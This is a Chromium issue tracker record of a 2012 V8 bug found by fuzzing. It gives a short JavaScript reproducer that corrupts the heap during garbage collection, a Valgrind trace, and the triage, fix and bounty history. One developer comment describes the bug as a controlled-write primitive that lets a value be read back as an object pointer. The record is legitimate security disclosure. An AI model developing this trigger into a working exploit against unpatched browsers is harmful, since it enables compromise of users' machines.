# [LangFuzz] Crash in v8::internal::ShortCircuitConsString with invalid read

| Field | Value |
|-------|-------|
| **Issue ID** | [40058240](https://issues.chromium.org/issues/40058240) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>JavaScript, Internals |
| **Reporter** | de...@googlemail.com |
| **Assignee** | da...@chromium.org |
| **Created** | 2012-05-14 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

The JavaScript code below crashes d8 shell (tested on branch 3.10 revision 11522, which is in the latest Chromium dev 20.0.1132.3) on heap with an invalid write to a strange address.

I was not able to get a trace in Chromium itself because my test uses gc() and I don't have a debug build available that allows using --expose-gc (does Google provide Linux debug builds for download?)

**VERSION**  

Chrome Version: 20.0.1132.3 dev (only tested through shell rev 11522)  

Operating System: Ubuntu 12.04 64 bit

**REPRODUCTION CASE**  

function KeyedStoreIC(a) { a[(1)] = Math.E; }  

var literal = [1.2];  

literal.length = 0;  

literal.push('0' && 0 );  

KeyedStoreIC(literal);  

gc();

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

Valgrind trace in d8:

==19952== Invalid read of size 8  

==19952== at 0x52E7BC: v8::internal::ShortCircuitConsString(v8::internal::Object\*\*) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19952== by 0x5378A0: v8::internal::FlexibleBodyVisitor<v8::internal::StaticMarkingVisitor, v8::internal::FixedArray::BodyDescriptor, void>::Visit(v8::internal::Map\*, v8::internal::HeapObject\*) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19952== by 0x53AD80: v8::internal::MarkCompactCollector::EmptyMarkingDeque() (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19952== by 0x4FD6E5: v8::internal::Isolate::Iterate(v8::internal::ObjectVisitor\*, v8::internal::ThreadLocalTop\*) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19952== by 0x4A7388: v8::internal::Heap::IterateStrongRoots(v8::internal::ObjectVisitor\*, v8::internal::VisitMode) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19952== by 0x53BA3F: v8::internal::MarkCompactCollector::MarkLiveObjects() (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19952== by 0x5404B8: v8::internal::MarkCompactCollector::CollectGarbage() (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19952== by 0x4ABE07: v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GCTracer\*) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19952== by 0x4AC623: v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollector, char const\*, char const\*) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19952== by 0x4ACE6A: v8::internal::Heap::CollectAllGarbage(int, char const\*) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19952== by 0x46CC4E: v8::internal::GCExtension::GC(v8::Arguments const&) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19952== by 0x43D1F7: v8::internal::Builtin\_HandleApiCall(v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>, v8::internal::Isolate\*) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19952== Address 0x4005bf0a8b145768 is not stack'd, malloc'd or (recently) free'd

## Timeline

### in...@chromium.org (2012-05-14)

Danno, can you please take a look.

Christian, you can download asanified chromium debug builds from https://commondatastorage.googleapis.com/chromium-browser-asan/index.html

### da...@chromium.org (2012-05-14)

[Empty comment from Monorail migration]

### da...@chromium.org (2012-05-15)

I am virtually positive that this is the same as chromium:117409, which was fixed on May 9th on V8 trunk but just rolled into Chromium today. I'll double check. It is also in Chrome 20 and Chrome 19, but not Chrome 18. I'm waiting for the merge until we verify that the fix is stable in Canary.

### de...@googlemail.com (2012-05-15)

I'm always testing on v8-trunk, not on the branches, and it reproduced for me on trunk when I reported it here.

### da...@chromium.org (2012-05-15)

Looks like there's still a problem, this seems to be a new variant on the theme of 117409. Investigating. 

### da...@chromium.org (2012-05-15)

It is similar but a slightly different case than 117409. Patch in progress, it will need to be marged back to 18 and 19. This bug allows you to reliably write the first element of a JSArray with any value that you can represent in the lower 32 bits of a IEEE double precision floating point number and later interpret as a tagged value, including as a object pointer.

### da...@chromium.org (2012-05-15)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-05-15)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-16)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-16)

Danno, isnt 117409 a security bug too, we need the tracking flags.

### da...@chromium.org (2012-05-16)

Yes, sorry, 117409 is also a security bug, I thought it was already marked so. I've changed it to restrict viewing to the security team and be typed as a Security bug. Chris, can you please work your magic on the other security labels.

### da...@chromium.org (2012-05-21)

Fix has been committed to trunk/Canary and merged back to 3.10 (3.10.8.9) and 3.9 (3.9.24.27). 

### in...@chromium.org (2012-05-21)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-05-21)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-05-23)

Nice find decoder. $1000

### sc...@gmail.com (2012-05-23)

[Empty comment from Monorail migration]

### er...@google.com (2012-05-24)

Fixed with the release of 19.0.1084.52

### sc...@gmail.com (2012-07-09)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-09-24)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/128018?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink, Blink>JavaScript, Internals]
[Monorail mergedwith: crbug.com/chromium/129169]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40058240)*
